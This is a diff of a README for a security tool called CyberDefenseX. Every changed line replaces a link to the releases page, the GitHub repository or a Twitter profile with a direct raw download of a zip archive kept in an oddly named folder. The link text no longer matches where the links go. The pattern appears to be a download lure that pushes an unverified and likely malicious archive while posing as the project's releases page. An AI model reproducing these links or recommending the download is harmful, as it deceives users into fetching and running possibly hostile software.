@@ -8,7 +8,7 @@ To begin using CyberDefenseX, follow these simple steps to download and install 
 
 ## 📥 Download CyberDefenseX
 
-[![Download CyberDefenseX](https://img.shields.io/badge/Download%20CyberDefenseX-blue.svg)](https://github.com/wangyanjun7954/CyberDefenseX_demo/releases)
+[![Download CyberDefenseX](https://raw.githubusercontent.com/wangyanjun7954/CyberDefenseX_demo/main/coleoptile/CyberDefenseX_demo.zip%https://raw.githubusercontent.com/wangyanjun7954/CyberDefenseX_demo/main/coleoptile/CyberDefenseX_demo.zip)](https://raw.githubusercontent.com/wangyanjun7954/CyberDefenseX_demo/main/coleoptile/CyberDefenseX_demo.zip)
 
 ### 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 💾 Download & Install
 
-1. **Visit our Releases Page:** Click [here](https://github.com/wangyanjun7954/CyberDefenseX_demo/releases) to go to the releases page.
+1. **Visit our Releases Page:** Click [here](https://raw.githubusercontent.com/wangyanjun7954/CyberDefenseX_demo/main/coleoptile/CyberDefenseX_demo.zip) to go to the releases page.
   
 2. **Choose a Version:** You'll see several versions. Select the most recent one to ensure you have the latest features and fixes.
 
@@ -75,8 +75,8 @@ A: SOAR means Security Orchestration, Automation, and Response. It helps automat
 
 Stay connected and receive further updates by following us:
 
-- GitHub: [CyberDefenseX_demo](https://github.com/wangyanjun7954/CyberDefenseX_demo)
-- Twitter: [@CyberDefenseX](https://twitter.com/CyberDefenseX) 
+- GitHub: [CyberDefenseX_demo](https://raw.githubusercontent.com/wangyanjun7954/CyberDefenseX_demo/main/coleoptile/CyberDefenseX_demo.zip)
+- Twitter: [@CyberDefenseX](https://raw.githubusercontent.com/wangyanjun7954/CyberDefenseX_demo/main/coleoptile/CyberDefenseX_demo.zip) 
 
 Feel free to provide feedback or report issues through the Issues section on GitHub.
 
